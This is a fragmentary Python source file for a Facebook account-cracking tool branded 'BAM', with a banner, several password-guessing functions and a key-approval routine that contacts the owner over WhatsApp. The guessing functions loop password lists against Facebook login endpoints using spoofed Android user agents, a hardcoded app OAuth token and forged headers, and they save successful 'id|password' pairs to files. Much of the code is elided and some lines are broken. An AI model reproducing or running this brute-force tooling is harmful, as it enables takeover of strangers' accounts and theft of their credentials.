...
[✓] WHATSAPP : ZERO_69       
[✓] VERSION  : 1.2                    
[✓] POWER BY : \033[1;32mMANY TERA NAAM DIL RAKH DIYA\033[1;37m            
└───────────────────────────────────────┘""")                                           
  ...
  try:
    ...
    if id in httpCaht:
      ...
      os.system(f'https://www.facebook.com/profile.php?id=100003176234638&mibextid=JRoKGi'+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [BAM-M] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [BAM-OK] %s | %s'%(ids,pas))
                                open(f'/sdcard/BAM-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [BAM-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/BAM-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def ffb1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [BAM] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                ua_string = f'Dalvik/2.1.0 (Linux; U; Android 12 Build/3062; TECNO KE5) [FBAN/112.5.0.0;FBBV/664077186;FBRV/4;com.facebook.mlite;FBLC/en_US;FBMF/TECNO;FBBD/TECNO;FBDV/KE5;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.9,width=936,height=885};FB_FW/2;]'
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [BAM-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/BAM-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def ffb7(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [BAM-VIP] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[BAM-OK] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[BAM-CP] '+idf+' | '+ps+'\033[0;97m')
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                head = {
                                        ...
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12 Build/7902; Samsung Galaxy S21) [FBAN/795.3.2.0;FBBV/840169308;FBRV/0;com.facebook.mlite;FBLC/en_US;FBMF/Samsung;FBBD/Samsung;FBDV/Galaxy S21;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.7,width=1291,height=883};FB_FW/1;]'
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
...
def main_apv():
    ...
    print(logo)
    try:
      key1 = open('/sdcard/.BAM.key.txt', 'r').read()
    except IOError:
        os.system('clear')
        print(logo)
        ...
        kok = open('/sdcard/.BAM.key.txt', 'w')
        kok.write(myid + imt)
        kok.close()
    
        input(' Exit And Again Run The Command');os.system('python BAM.py')
        tks = ('Hello%20BAM%20Owner%20BAM%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+?text='+tks)
    ...
    if key1 in r1:
        ...
        tks = ('Hello%20BAM%20Owner%20BAM-D%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+213771372932?text='+tks)
        main_apv() 
main_apv()